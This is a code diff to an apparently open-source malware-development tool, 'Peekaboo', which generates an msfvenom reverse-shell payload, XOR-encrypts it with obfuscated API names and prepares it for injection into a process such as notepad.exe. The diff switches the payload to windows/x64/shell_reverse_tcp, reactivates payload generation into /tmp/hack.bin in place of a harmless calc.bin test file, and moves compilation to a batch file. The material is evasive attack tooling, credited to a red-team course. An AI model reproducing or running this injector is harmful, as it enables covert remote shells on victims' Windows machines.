@@ -57,7 +57,7 @@ class PeekabooEncryptor():
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
-    msfv = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
+    msfv = "msfvenom -p windows/x64/shell_reverse_tcp"
     msfv += " LHOST=" + host
     msfv += " LPORT=" + port
     msfv += " -f raw"
@@ -73,21 +73,20 @@ def generate_payload(host, port):
 
 def run_peekaboo(host, port, proc_name):
     banner = """
-    #####  ###### #    #         ##         #####   ####   ####  
-    #    # #      #   #         #  #        #    # #    # #    # 
-    #    # #####  ####   ##### #    # ##### #####  #    # #    # 
-    #####  #      #  #         ######       #    # #    # #    # 
-    #      #      #   #        #    #       #    # #    # #    # 
-    #      ###### #    #       #    #       #####   ####   ####  
+    #####  ###### #    #         ##         #####   ####   ####
+    #    # #      #   #         #  #        #    # #    # #    #
+    #    # #####  ####   ##### #    # ##### #####  #    # #    #
+    #####  #      #  #         ######       #    # #    # #    #
+    #      #      #   #        #    #       #    # #    # #    #
+    #      ###### #    #       #    #       #####   ####   ####
     by @cocomelonc, many thanks to:
     https://institute.sektor7.net/red-team-operator-malware-development-essentials
     """
     print (Colors.BLUE + banner + Colors.ENDC)
-    # generate_payload(host, port)
+    generate_payload(host, port)
     encryptor = PeekabooEncryptor()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
-    # plaintext = open("/tmp/hack.bin", "rb").read()
-    plaintext = open("./calc.bin", "rb").read()
+    plaintext = open("/tmp/hack.bin", "rb").read()
 
     f_vaex = "VirtualAllocEx"
     f_op = "OpenProcess"
@@ -100,6 +99,7 @@ def run_peekaboo(host, port, proc_name):
 
     f_xor = "XOR("
 
+    print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
     f_xor = encryptor.random()
     ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
@@ -137,22 +137,24 @@ def run_peekaboo(host, port, proc_name):
     tmp.write(data)
     tmp.close()
 
-    try:
-        cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.exe peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
-        os.system(cmd)
-    except:
-        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
-        sys.exit()
-    else:
-        print (Colors.YELLOW + cmd + Colors.ENDC)
-        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
-        print (Colors.GREEN + "peekaboo.exe")
+    # try:
+    #     cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.exe peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
+    #     os.system(cmd)
+    # except:
+    #     print (Colors.RED + "error compiling template :(" + Colors.ENDC)
+    #     sys.exit()
+    # else:
+    #     print (Colors.YELLOW + cmd + Colors.ENDC)
+    #     print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
+    #     print (Colors.GREEN + "peekaboo.exe")
+    print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
+    print (Colors.GREEN + "compile via compile-inj.bat" + Colors.ENDC)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-l','--lhost', required = True, help = "local IP")
     parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
-    parser.add_argument('-e', '--proc', required = True, help = "process name", default = "notepad.exe")
+    parser.add_argument('-e', '--proc', required = False, help = "process name", default = "notepad.exe")
     args = vars(parser.parse_args())
     host, port = args['lhost'], args['lport']
     proc_name = args['proc']
